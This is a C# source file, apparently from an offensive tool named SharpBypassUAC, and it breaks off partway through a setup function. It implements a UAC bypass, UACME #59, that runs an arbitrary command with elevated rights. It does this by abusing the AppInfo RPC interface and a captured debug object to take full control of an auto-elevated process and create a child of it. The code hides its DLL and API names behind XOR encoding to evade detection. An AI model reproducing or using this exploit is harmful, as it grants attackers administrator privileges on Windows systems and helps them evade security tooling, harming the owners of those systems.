using System;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    /// <summary>
    /// UACME #59: ALPC debug object elevation bypass.
    ///
    /// Uses AppInfo RPC (RAiLaunchAdminProcess) to launch processes under the
    /// debugger. Captures the debug object handle from a non-elevated victim,
    /// then uses it to debug an auto-elevate process. The elevated process
    /// handle obtained from debug events is duplicated with PROCESS_ALL_ACCESS,
    /// then used as the parent for a new process via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
    ///
    /// Flow:
    ///   1. RPC to AppInfo → launch non-elevated winver.exe with DEBUG_PROCESS
    ///   2. NtQueryInformationProcess(ProcessDebugObjectHandle) → capture debug object
    ///   3. NtRemoveProcessDebug + TerminateProcess → detach and kill
    ///   4. RPC to AppInfo → launch elevated computerdefaults.exe with DEBUG_PROCESS
    ///   5. DbgUiSetThreadDebugObject → receive debug events on current thread
    ///   6. WaitForDebugEvent → CREATE_PROCESS_DEBUG_EVENT → capture process handle
    ///   7. NtDuplicateObject(pseudo-handle trick) → full access to elevated process
    ///   8. CreateProcessW with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS → child inherits token
    ///
    /// Unfixed: Windows 7 through Windows 11.
    /// </summary>
    public class AlpcDebug
    {
        #region XOR-encoded strings

        // XOR keys per DLL
        private static readonly byte _xkRpc = 0x51;
        private static readonly byte _xkNt = 0x37;
        private static readonly byte _xkK32 = 0x2D;
        private static readonly byte _xkAdv = 0x5A;

        // DLL names
        // "rpcrt4.dll" ^ 0x51
        private static readonly byte[] _dRpc = new byte[] { 0x23, 0x21, 0x32, 0x23, 0x25, 0x65, 0x7F, 0x35, 0x3D, 0x3D };
        // "ntdll.dll" ^ 0x37
        private static readonly byte[] _dNt = new byte[] { 0x59, 0x43, 0x53, 0x5B, 0x5B, 0x19, 0x53, 0x5B, 0x5B };
        // "kernel32.dll" ^ 0x2D
        private static readonly byte[] _dK32 = new byte[] { 0x46, 0x48, 0x5F, 0x43, 0x48, 0x41, 0x1E, 0x1F, 0x03, 0x49, 0x41, 0x41 };
        // "advapi32.dll" ^ 0x5A
        private static readonly byte[] _dAdv = new byte[] { 0x3B, 0x3E, 0x2C, 0x3B, 0x2A, 0x33, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36 };

        // rpcrt4.dll API names ^ 0x51
        // "RpcStringBindingComposeW"
        private static readonly byte[] _fRpcSBCW = new byte[] { 0x03, 0x21, 0x32, 0x02, 0x25, 0x23, 0x38, 0x3F, 0x36, 0x13, 0x38, 0x3F, 0x35, 0x38, 0x3F, 0x36, 0x12, 0x3E, 0x3C, 0x21, 0x3E, 0x22, 0x34, 0x06 };
        // "RpcBindingFromStringBindingW"
        private static readonly byte[] _fRpcBFSBW = new byte[] { 0x03, 0x21, 0x32, 0x13, 0x38, 0x3F, 0x35, 0x38, 0x3F, 0x36, 0x17, 0x23, 0x3E, 0x3C, 0x02, 0x25, 0x23, 0x38, 0x3F, 0x36, 0x13, 0x38, 0x3F, 0x35, 0x38, 0x3F, 0x36, 0x06 };
        // "RpcStringFreeW"
        private static readonly byte[] _fRpcSFW = new byte[] { 0x03, 0x21, 0x32, 0x02, 0x25, 0x23, 0x38, 0x3F, 0x36, 0x17, 0x23, 0x34, 0x34, 0x06 };
        // "RpcBindingFree"
        private static readonly byte[] _fRpcBF = new byte[] { 0x03, 0x21, 0x32, 0x13, 0x38, 0x3F, 0x35, 0x38, 0x3F, 0x36, 0x17, 0x23, 0x34, 0x34 };
        // "RpcBindingSetAuthInfoExW"
        private static readonly byte[] _fRpcBSAIEW = new byte[] { 0x03, 0x21, 0x32, 0x13, 0x38, 0x3F, 0x35, 0x38, 0x3F, 0x36, 0x02, 0x34, 0x25, 0x10, 0x24, 0x25, 0x39, 0x18, 0x3F, 0x37, 0x3E, 0x14, 0x29, 0x06 };
        // "RpcAsyncInitializeHandle"
        private static readonly byte[] _fRpcAIH = new byte[] { 0x03, 0x21, 0x32, 0x10, 0x22, 0x28, 0x3F, 0x32, 0x18, 0x3F, 0x38, 0x25, 0x38, 0x30, 0x3D, 0x38, 0x2B, 0x34, 0x19, 0x30, 0x3F, 0x35, 0x3D, 0x34 };
        // "RpcAsyncCompleteCall"
        private static readonly byte[] _fRpcACC = new byte[] { 0x03, 0x21, 0x32, 0x10, 0x22, 0x28, 0x3F, 0x32, 0x12, 0x3E, 0x3C, 0x21, 0x3D, 0x34, 0x25, 0x34, 0x12, 0x30, 0x3D, 0x3D };
        // "NdrAsyncClientCall"
        private static readonly byte[] _fNdrACC = new byte[] { 0x1F, 0x35, 0x23, 0x10, 0x22, 0x28, 0x3F, 0x32, 0x12, 0x3D, 0x38, 0x34, 0x3F, 0x25, 0x12, 0x30, 0x3D, 0x3D };

        // ntdll.dll API names ^ 0x37
        // "NtQueryInformationProcess"
        private static readonly byte[] _fNtQIP = new byte[] { 0x79, 0x43, 0x66, 0x42, 0x52, 0x45, 0x4E, 0x7E, 0x59, 0x51, 0x58, 0x45, 0x5A, 0x56, 0x43, 0x5E, 0x58, 0x59, 0x67, 0x45, 0x58, 0x54, 0x52, 0x44, 0x44 };
        // "NtRemoveProcessDebug"
        private static readonly byte[] _fNtRPD = new byte[] { 0x79, 0x43, 0x65, 0x52, 0x5A, 0x58, 0x41, 0x52, 0x67, 0x45, 0x58, 0x54, 0x52, 0x44, 0x44, 0x73, 0x52, 0x55, 0x42, 0x50 };
        // "NtDuplicateObject"
        private static readonly byte[] _fNtDO = new byte[] { 0x79, 0x43, 0x73, 0x42, 0x47, 0x5B, 0x5E, 0x54, 0x56, 0x43, 0x52, 0x78, 0x55, 0x5D, 0x52, 0x54, 0x43 };
        // "DbgUiSetThreadDebugObject"
        private static readonly byte[] _fDbgUI = new byte[] { 0x73, 0x55, 0x50, 0x62, 0x5E, 0x64, 0x52, 0x43, 0x63, 0x5F, 0x45, 0x52, 0x56, 0x53, 0x73, 0x52, 0x55, 0x42, 0x50, 0x78, 0x55, 0x5D, 0x52, 0x54, 0x43 };

        // kernel32.dll API names ^ 0x2D
        // "CloseHandle"
        private static readonly byte[] _fCloseH = new byte[] { 0x6E, 0x41, 0x42, 0x5E, 0x48, 0x65, 0x4C, 0x43, 0x49, 0x41, 0x48 };
        // "WaitForDebugEvent"
        private static readonly byte[] _fWaitDbg = new byte[] { 0x7A, 0x4C, 0x44, 0x59, 0x6B, 0x42, 0x5F, 0x69, 0x48, 0x4F, 0x58, 0x4A, 0x68, 0x5B, 0x48, 0x43, 0x59 };
        // "ContinueDebugEvent"
        private static readonly byte[] _fContDbg = new byte[] { 0x6E, 0x42, 0x43, 0x59, 0x44, 0x43, 0x58, 0x48, 0x69, 0x48, 0x4F, 0x58, 0x4A, 0x68, 0x5B, 0x48, 0x43, 0x59 };
        // "CreateProcessW"
        private static readonly byte[] _fCreatePW = new byte[] { 0x6E, 0x5F, 0x48, 0x4C, 0x59, 0x48, 0x7D, 0x5F, 0x42, 0x4E, 0x48, 0x5E, 0x5E, 0x7A };
        // "InitializeProcThreadAttributeList"
        private static readonly byte[] _fInitPTAL = new byte[] { 0x64, 0x43, 0x44, 0x59, 0x44, 0x4C, 0x41, 0x44, 0x57, 0x48, 0x7D, 0x5F, 0x42, 0x4E, 0x79, 0x45, 0x5F, 0x48, 0x4C, 0x49, 0x6C, 0x59, 0x59, 0x5F, 0x44, 0x4F, 0x58, 0x59, 0x48, 0x61, 0x44, 0x5E, 0x59 };
        // "UpdateProcThreadAttribute"
        private static readonly byte[] _fUpdPTA = new byte[] { 0x78, 0x5D, 0x49, 0x4C, 0x59, 0x48, 0x7D, 0x5F, 0x42, 0x4E, 0x79, 0x45, 0x5F, 0x48, 0x4C, 0x49, 0x6C, 0x59, 0x59, 0x5F, 0x44, 0x4F, 0x58, 0x59, 0x48 };
        // "DeleteProcThreadAttributeList"
        private static readonly byte[] _fDelPTAL = new byte[] { 0x69, 0x48, 0x41, 0x48, 0x59, 0x48, 0x7D, 0x5F, 0x42, 0x4E, 0x79, 0x45, 0x5F, 0x48, 0x4C, 0x49, 0x6C, 0x59, 0x59, 0x5F, 0x44, 0x4F, 0x58, 0x59, 0x48, 0x61, 0x44, 0x5E, 0x59 };
        // "TerminateProcess"
        private static readonly byte[] _fTermProc = new byte[] { 0x79, 0x48, 0x5F, 0x40, 0x44, 0x43, 0x4C, 0x59, 0x48, 0x7D, 0x5F, 0x42, 0x4E, 0x48, 0x5E, 0x5E };
        // "WaitForSingleObject"
        private static readonly byte[] _fWaitSO = new byte[] { 0x7A, 0x4C, 0x44, 0x59, 0x6B, 0x42, 0x5F, 0x7E, 0x44, 0x43, 0x4A, 0x41, 0x48, 0x62, 0x4F, 0x47, 0x48, 0x4E, 0x59 };
        // "CreateEventW"
        private static readonly byte[] _fCreateEvt = new byte[] { 0x6E, 0x5F, 0x48, 0x4C, 0x59, 0x48, 0x68, 0x5B, 0x48, 0x43, 0x59, 0x7A };

        // advapi32.dll API names ^ 0x5A
        // "CreateWellKnownSid"
        private static readonly byte[] _fCreateWKS = new byte[] { 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x0D, 0x3F, 0x36, 0x36, 0x11, 0x34, 0x35, 0x2D, 0x34, 0x09, 0x33, 0x3E };

        #endregion

        #region MIDL format strings

        // Procedure format string (103 bytes) from appinfo64.c
        private static readonly byte[] ProcFormatString = new byte[] {
            0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00,
            0x32, 0x00, 0x08, 0x00, 0x20, 0x00, 0x24, 0x00, 0xC7, 0x0C,
            0x0A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x0B, 0x00, 0x10, 0x00, 0x02, 0x00, 0x0B, 0x00, 0x18, 0x00,
            0x02, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x48, 0x00,
            0x28, 0x00, 0x08, 0x00, 0x0B, 0x01, 0x30, 0x00, 0x08, 0x00,
            0x0B, 0x01, 0x38, 0x00, 0x08, 0x00, 0x0B, 0x01, 0x40, 0x00,
            0x16, 0x00, 0x48, 0x00, 0x48, 0x00, 0xB9, 0x00, 0x48, 0x00,
            0x50, 0x00, 0x08, 0x00, 0x13, 0x61, 0x58, 0x00, 0x38, 0x00,
            0x50, 0x21, 0x60, 0x00, 0x08, 0x00, 0x70, 0x00, 0x68, 0x00,
            0x08, 0x00, 0x00
        };

        // Type format string (75 bytes) from appinfo64.c
        private static readonly byte[] TypeFormatString = new byte[] {
            0x00, 0x00, 0x12, 0x08, 0x25, 0x5C, 0x11, 0x08, 0x25, 0x5C,
            0x11, 0x00, 0x0A, 0x00, 0x15, 0x03, 0x08, 0x00, 0x08, 0x08,
            0x5C, 0x5B, 0x1A, 0x03, 0x38, 0x00, 0x00, 0x00, 0x14, 0x00,
            0x36, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x06,
            0x3E, 0x4C, 0x00, 0xE3, 0xFF, 0x40, 0x5C, 0x5B, 0x12, 0x08,
            0x05, 0x5C, 0x11, 0x04, 0x02, 0x00, 0x1A, 0x03, 0x18, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xB9, 0xB9, 0x08, 0x08, 0x5C, 0x5B,
            0x11, 0x0C, 0x08, 0x5C, 0x00
        };

        #endregion

        #region Constants

        private const int DEBUG_PROCESS = 0x1;
        private const int CREATE_UNICODE_ENVIRONMENT = 0x400;
        private const int CREATE_NEW_CONSOLE = 0x10;
        private const int EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const int CREATE_PROCESS_DEBUG_EVENT = 3;
        private const int DBG_CONTINUE = 0x00010002;
        private const int PROCESS_ALL_ACCESS = 0x001F0FFF;
        private const int STARTF_USESHOWWINDOW = 0x1;
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        private const int INFINITE = -1;
        private const int ProcessDebugObjectHandle = 30;
        private const int SECURITY_MAX_SID_SIZE = 68;
        private const uint RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
        private const uint RPC_C_AUTHN_WINNT = 10;
        private const int WinLocalSystemSid = 22;
        private const int RpcNotificationTypeEvent = 1;

        // AppInfo RPC interface UUID
        private static readonly Guid AppInfoUuid = new Guid("201ef99a-7fa0-444c-9399-19ba84f12a1a");
        // NDR Transfer Syntax
        private static readonly Guid TransferSyntaxUuid = new Guid("8A885D04-1CEB-11C9-9FE8-08002B104860");

        // DEBUG_EVENT size on x64 (accommodates largest union member)
        private const int DEBUG_EVENT_SIZE = 176;
        // Offset of u.CreateProcessInfo.hProcess within DEBUG_EVENT on x64
        private const int DEBUG_EVENT_HPROCESS_OFFSET = 24;

        // APP_STARTUP_INFO offsets on x64 (56 bytes total)
        private const int APP_STARTUP_INFO_SIZE = 56;
        private const int APP_STARTUP_INFO_DWFLAGS = 36;
        private const int APP_STARTUP_INFO_WSHOWWINDOW = 40;

        // APP_PROCESS_INFORMATION offsets on x64 (24 bytes total)
        private const int APP_PROCESS_INFO_SIZE = 24;

        // RPC_ASYNC_STATE offsets on x64 (112 bytes total)
        private const int RPC_ASYNC_STATE_SIZE = 112;
        private const int RPC_ASYNC_NOTIFICATION_TYPE = 44;
        private const int RPC_ASYNC_HEVENT = 48;

        #endregion

        #region Delegate types

        // rpcrt4.dll
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int RpcStringBindingComposeWDelegate(
            IntPtr objUuid, IntPtr protSeq, IntPtr networkAddr,
            IntPtr endpoint, IntPtr options, out IntPtr stringBinding);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int RpcBindingFromStringBindingWDelegate(
            IntPtr stringBinding, out IntPtr binding);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int RpcStringFreeWDelegate(ref IntPtr str);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int RpcBindingFreeDelegate(ref IntPtr binding);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int RpcBindingSetAuthInfoExWDelegate(
            IntPtr binding, IntPtr serverPrincName, uint authnLevel,
            uint authnSvc, IntPtr authIdentity, uint authzSvc, IntPtr securityQos);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int RpcAsyncInitializeHandleDelegate(IntPtr asyncState, int size);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int RpcAsyncCompleteCallDelegate(IntPtr asyncState, IntPtr reply);

        // NdrAsyncClientCall: Cdecl, all params as IntPtr for x64 stack alignment
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate IntPtr NdrAsyncClientCallDelegate(
            IntPtr pStubDesc, IntPtr pFormat,
            IntPtr asyncState, IntPtr binding,
            IntPtr executablePath, IntPtr commandLine,
            IntPtr startFlags, IntPtr creationFlags,
            IntPtr currentDirectory, IntPtr windowStation,
            IntPtr startupInfo, IntPtr hWnd,
            IntPtr timeout, IntPtr processInfo, IntPtr elevationType);

        // ntdll.dll
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtQueryInformationProcessDelegate(
            IntPtr processHandle, int processInfoClass,
            IntPtr processInfo, int processInfoLength, IntPtr returnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtRemoveProcessDebugDelegate(IntPtr processHandle, IntPtr debugObjectHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtDuplicateObjectDelegate(
            IntPtr sourceProcessHandle, IntPtr sourceHandle,
            IntPtr targetProcessHandle, out IntPtr targetHandle,
            uint desiredAccess, uint handleAttributes, uint options);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int DbgUiSetThreadDebugObjectDelegate(IntPtr debugObjectHandle);

        // kernel32.dll
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseHandleDelegate(IntPtr handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool WaitForDebugEventDelegate(IntPtr lpDebugEvent, int dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool ContinueDebugEventDelegate(int processId, int threadId, int continueStatus);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool CreateProcessWDelegate(
            IntPtr appName, IntPtr cmdLine, IntPtr procAttr, IntPtr threadAttr,
            bool inheritHandles, int creationFlags, IntPtr environment,
            IntPtr currentDir, IntPtr startupInfo, IntPtr processInfo);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool TerminateProcessDelegate(IntPtr hProcess, int exitCode);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int WaitForSingleObjectDelegate(IntPtr handle, int milliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr CreateEventWDelegate(IntPtr attr, bool manualReset, bool initialState, IntPtr name);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool InitializeProcThreadAttributeListDelegate(
            IntPtr attrList, int attrCount, int flags, ref IntPtr size);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool UpdateProcThreadAttributeDelegate(
            IntPtr attrList, int flags, IntPtr attribute,
            IntPtr value, IntPtr cbSize, IntPtr previousValue, IntPtr returnSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void DeleteProcThreadAttributeListDelegate(IntPtr attrList);

        // advapi32.dll
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CreateWellKnownSidDelegate(
            int wellKnownSidType, IntPtr domainSid, IntPtr pSid, ref int cbSid);

        // MIDL allocators (must be pinned to prevent GC while native code holds pointers)
        delegate IntPtr MidlAllocDelegate(IntPtr size);
        delegate void MidlFreeDelegate(IntPtr ptr);

        #endregion

        #region Instance fields — resolved APIs

        private RpcStringBindingComposeWDelegate _rpcStringBindingCompose;
        private RpcBindingFromStringBindingWDelegate _rpcBindingFromStringBinding;
        private RpcStringFreeWDelegate _rpcStringFree;
        private RpcBindingFreeDelegate _rpcBindingFree;
        private RpcBindingSetAuthInfoExWDelegate _rpcBindingSetAuthInfoEx;
        private RpcAsyncInitializeHandleDelegate _rpcAsyncInitHandle;
        private RpcAsyncCompleteCallDelegate _rpcAsyncCompleteCall;
        private NdrAsyncClientCallDelegate _ndrAsyncClientCall;

        private NtQueryInformationProcessDelegate _ntQueryInformationProcess;
        private NtRemoveProcessDebugDelegate _ntRemoveProcessDebug;
        private NtDuplicateObjectDelegate _ntDuplicateObject;
        private DbgUiSetThreadDebugObjectDelegate _dbgUiSetThreadDebugObject;

        private CloseHandleDelegate _closeHandle;
        private WaitForDebugEventDelegate _waitForDebugEvent;
        private ContinueDebugEventDelegate _continueDebugEvent;
        private CreateProcessWDelegate _createProcessW;
        private TerminateProcessDelegate _terminateProcess;
        private WaitForSingleObjectDelegate _waitForSingleObject;
        private CreateEventWDelegate _createEventW;
        private InitializeProcThreadAttributeListDelegate _initProcThreadAttrList;
        private UpdateProcThreadAttributeDelegate _updateProcThreadAttr;
        private DeleteProcThreadAttributeListDelegate _deleteProcThreadAttrList;
        private CreateWellKnownSidDelegate _createWellKnownSid;

        #endregion

        #region MIDL infrastructure

        private IntPtr _pStubDesc;
        private IntPtr _pClientInterface;
        private IntPtr _pAutoHandle;
        private GCHandle _procFmtPin;
        private GCHandle _typeFmtPin;
        private static MidlAllocDelegate _midlAllocDel;
        private static MidlFreeDelegate _midlFreeDel;

        private static IntPtr MidlAlloc(IntPtr size) { return Marshal.AllocHGlobal(size); }
        private static void MidlFree(IntPtr ptr) { Marshal.FreeHGlobal(ptr); }

        #endregion

        public AlpcDebug(byte[] encodedCommand)
        {
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            string command = Encoding.UTF8.GetString(encodedCommand);

            Console.WriteLine("[*] ALPC debug object bypass (UACME #59)");

            // Resolve all API functions via D/Invoke
            ResolveApis();

            // Build MIDL RPC stubs
            BuildMidlStubs();

            IntPtr hProcess1 = IntPtr.Zero, hThread1 = IntPtr.Zero;
            IntPtr hProcess2 = IntPtr.Zero, hThread2 = IntPtr.Zero;
            IntPtr dbgHandle = IntPtr.Zero, dupHandle = IntPtr.Zero;
            IntPtr dbgProcessHandle = IntPtr.Zero;
            bool debugObjectSet = false;

            try
            {
                // Step 1: Launch non-elevated winver.exe under debug
                int pid1, tid1;
                if (!AicLaunchAdminProcess(
                    "C:\\Windows\\System32\\winver.exe",
                    0,  // StartFlags = 0 (non-elevated request)
                    CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
                    SW_HIDE,
                    out hProcess1, out hThread1, out pid1, out tid1))
                {
                    Console.WriteLine("[!] Failed to launch non-elevated victim process");
                    return;
                }

                Console.WriteLine("[+] Launched non-elevated winver.exe under debug (PID: " + pid1 + ")");

                // Step 2: Capture debug object handle via NtQueryInformationProcess
                IntPtr pDbgHandle = Marshal.AllocHGlobal(IntPtr.Size);
                try
                {
                    Marshal.WriteIntPtr(pDbgHandle, IntPtr.Zero);
                    int ntstatus = _ntQueryInformationProcess(
                        hProcess1, ProcessDebugObjectHandle,
                        pDbgHandle, IntPtr.Size, IntPtr.Zero);

                    if (ntstatus != 0)
                    {
                        Console.WriteLine("[!] NtQueryInformationProcess failed: 0x" + ntstatus.ToString("X8"));
                        _terminateProcess(hProcess1, 0);
                        return;
                    }
                    dbgHandle = Marshal.ReadIntPtr(pDbgHandle);
                }
                finally
                {
                    Marshal.FreeHGlobal(pDbgHandle);
                }

                Console.WriteLine("[+] Captured debug object handle: 0x" + dbgHandle.ToString("X"));

                // Step 3: Detach debugger and terminate non-elevated victim
                _ntRemoveProcessDebug(hProcess1, dbgHandle);
                _terminateProcess(hProcess1, 0);
                _closeHandle(hThread1); hThread1 = IntPtr.Zero;
                _closeHandle(hProcess1); hProcess1 = IntPtr.Zero;

                // Step 4: Launch elevated computerdefaults.exe under debug
                int pid2, tid2;
                if (!AicLaunchAdminProcess(
                    "C:\\Windows\\System32\\computerdefaults.exe",
                    1,  // StartFlags = 1 (request elevation)
                    CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
                    SW_HIDE,
                    out hProcess2, out hThread2, out pid2, out tid2))
                {
                    Console.WriteLine("[!] Failed to launch elevated victim process");
                    return;
                }

                Console.WriteLine("[+] Launched elevated computerdefaults.exe under debug (PID: " + pid2 + ")");

                // Step 5: Set debug object on current thread to receive events
                _dbgUiSetThreadDebugObject(dbgHandle);
                debugObjectSet = true;

                // Step 6: Wait for CREATE_PROCESS_DEBUG_EVENT to capture elevated process handle
                IntPtr debugEvent = Marshal.AllocHGlobal(DEBUG_EVENT_SIZE);
                try
                {
                    ZeroMem(debugEvent, DEBUG_EVENT_SIZE);

                    while (true)
                    {
                        if (!_waitForDebugEvent(debugEvent, INFINITE))
                            break;

                        int eventCode = Marshal.ReadInt32(debugEvent, 0);
                        int eventPid = Marshal.ReadInt32(debugEvent, 4);
                        int eventTid = Marshal.ReadInt32(debugEvent, 8);

                        if (eventCode == CREATE_PROCESS_DEBUG_EVENT)
                        {
                            dbgProcessHandle = Marshal.ReadIntPtr(debugEvent, DEBUG_EVENT_HPROCESS_OFFSET);
                        }

                        if (dbgProcessHandle != IntPtr.Zero)
                            break;

                        _continueDebugEvent(eventPid, eventTid, DBG_CONTINUE);
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(debugEvent);
                }

                if (dbgProcessHandle == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Failed to capture elevated process handle from debug events");
                    return;
                }

                Console.WriteLine("[+] Captured elevated process handle from debug event");

                // Step 7: Duplicate handle with PROCESS_ALL_ACCESS using pseudo-handle trick
                // dbgProcessHandle is a limited handle TO the elevated process (from debug event)
                // We duplicate the elevated process's self-handle (-1) from its handle table
                // into our process with full access rights
                int dupStatus = _ntDuplicateObject(
                    dbgProcessHandle,       // SourceProcessHandle: the elevated process
                    (IntPtr)(-1),           // SourceHandle: NtCurrentProcess() pseudo-handle
                    (IntPtr)(-1),           // TargetProcessHandle: our process
                    out dupHandle,
                    (uint)PROCESS_ALL_ACCESS,
                    0, 0);

                if (dupStatus != 0 || dupHandle == IntPtr.Zero)
                {
                    Console.WriteLine("[!] NtDuplicateObject failed: 0x" + dupStatus.ToString("X8"));
                    return;
                }

                Console.WriteLine("[+] Duplicated elevated process handle with PROCESS_ALL_ACCESS");

                // Step 8: Create new process with elevated process as parent
                string file;
                string parameters = null;
                ParseCommand(command, out file, out parameters);

                string fullCmd = parameters != null ? file + " " + parameters : file;

                if (CreateProcessFromParent(dupHandle, fullCmd))
                {
                    Console.WriteLine("[+] Elevated command executed via ALPC debug object chain");
                }
                else
                {
                    Console.WriteLine("[!] CreateProcessFromParent failed");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] AlpcDebug exception: " + ex.Message);
            }
            finally
            {
                // Cleanup section
                if (debugObjectSet)
                    _dbgUiSetThreadDebugObject(IntPtr.Zero);

                if (dbgHandle != IntPtr.Zero)
                    _closeHandle(dbgHandle);

                if (dbgProcessHandle != IntPtr.Zero)
                    _closeHandle(dbgProcessHandle);

                if (dupHandle != IntPtr.Zero)
                    _closeHandle(dupHandle);

                if (hThread1 != IntPtr.Zero)
                    _closeHandle(hThread1);

                if (hProcess1 != IntPtr.Zero)
                {
                    _terminateProcess(hProcess1, 0);
                    _closeHandle(hProcess1);
                }

                if (hThread2 != IntPtr.Zero)
                    _closeHandle(hThread2);

                if (hProcess2 != IntPtr.Zero)
                {
                    _terminateProcess(hProcess2, 0);
                    _closeHandle(hProcess2);
                }

                // Free MIDL infrastructure
                FreeMidlStubs();
            }
        }

        private void ResolveApis()
        {
            string rpcDll = W.X(_dRpc, _xkRpc);
            string ntDll = W.X(_dNt, _xkNt);
            string k32Dll = W.X(_dK32, _xkK32);
            string advDll = W.X(_dAdv, _xkAdv);

            // rpcrt4.dll
            _rpcStringBindingCompose = W.G<RpcStringBindingComposeWDelegate>(rpcDll, W.X(_fRpcSBCW, _xkRpc));
            _rpcBindingFromStringBinding = W.G<RpcBindingFromStringBindingWDelegate>(rpcDll, W.X(_fRpcBFSBW, _xkRpc));
            _rpcStringFree = W.G<RpcStringFreeWDelegate>(rpcDll, W.X(_fRpcSFW, _xkRpc));
            _rpcBindingFree = W.G<RpcBindingFreeDelegate>(rpcDll, W.X(_fRpcBF, _xkRpc));
            _rpcBindingSetAuthInfoEx = W.G<RpcBindingSetAuthInfoExWDelegate>(rpcDll, W.X(_fRpcBSAIEW, _xkRpc));
            _rpcAsyncInitHandle = W.G<RpcAsyncInitializeHandleDelegate>(rpcDll, W.X(_fRpcAIH, _xkRpc));
            _rpcAsyncCompleteCall = W.G<RpcAsyncCompleteCallDelegate>(rpcDll, W.X(_fRpcACC, _xkRpc));
            _ndrAsyncClientCall = W.G<NdrAsyncClientCallDelegate>(rpcDll, W.X(_fNdrACC, _xkRpc));

            // ntdll.dll
            _ntQueryInformationProcess = W.G<NtQueryInformationProcessDelegate>(ntDll, W.X(_fNtQIP, _xkNt));
            _ntRemoveProcessDebug = W.G<NtRemoveProcessDebugDelegate>(ntDll, W.X(_fNtRPD, _xkNt));
            _ntDuplicateObject = W.G<NtDuplicateObjectDelegate>(ntDll, W.X(_fNtDO, _xkNt));
            _dbgUiSetThreadDebugObject = W.G<DbgUiSetThreadDebugObjectDelegate>(ntDll, W.X(_fDbgUI, _xkNt));

            // kernel32.dll
            _closeHandle = W.G<CloseHandleDelegate>(k32Dll, W.X(_fCloseH, _xkK32));
            _waitForDebugEvent = W.G<WaitForDebugEventDelegate>(k32Dll, W.X(_fWaitDbg, _xkK32));
            _continueDebugEvent = W.G<ContinueDebugEventDelegate>(k32Dll, W.X(_fContDbg, _xkK32));
            _createProcessW = W.G<CreateProcessWDelegate>(k32Dll, W.X(_fCreatePW, _xkK32));
            _terminateProcess = W.G<TerminateProcessDelegate>(k32Dll, W.X(_fTermProc, _xkK32));
            _waitForSingleObject = W.G<WaitForSingleObjectDelegate>(k32Dll, W.X(_fWaitSO, _xkK32));
            _createEventW = W.G<CreateEventWDelegate>(k32Dll, W.X(_fCreateEvt, _xkK32));
            _initProcThreadAttrList = W.G<InitializeProcThreadAttributeListDelegate>(k32Dll, W.X(_fInitPTAL, _xkK32));
            _updateProcThreadAttr = W.G<UpdateProcThreadAttributeDelegate>(k32Dll, W.X(_fUpdPTA, _xkK32));
            _deleteProcThreadAttrList = W.G<DeleteProcThreadAttributeListDelegate>(k32Dll, W.X(_fDelPTAL, _xkK32));

            // advapi32.dll
            _createWellKnownSid = W.G<CreateWellKnownSidDelegate>(advDll, W.X(_fCreateWKS, _xkAdv));
        }

        private void BuildMidlStubs()
        {
            // Pin format strings so GC doesn't move them
            _procFmtPin = GCHandle.Alloc(ProcFormatString, GCHandleType.Pinned);
            _typeFmtPin = GCHandle.Alloc(TypeFormatString, GCHandleType.Pinned);

            // Build RPC_CLIENT_INTERFACE (96 bytes)
            _pClientInterface = Marshal.AllocHGlobal(96);
            ZeroMem(_pClientInterface, 96);
            Marshal.WriteInt32(_pClientInterface, 0, 96); // Length
            byte[] ifId = AppInfoUuid.ToByteArray();
            Marshal.Copy(ifId, 0, IntPtrAdd(_pClientInterface, 4), 16);
            Marshal.WriteInt16(_pClientInterface, 20, 1); // Major = 1
            Marshal.WriteInt16(_pClientInterface, 22, 0); // Minor = 0
            byte[] ts = TransferSyntaxUuid.ToByteArray();
            Marshal.Copy(ts, 0, IntPtrAdd(_pClientInterface, 24), 16);
            Marshal.WriteInt16(_pClientInterface, 40, 2); // Major = 2
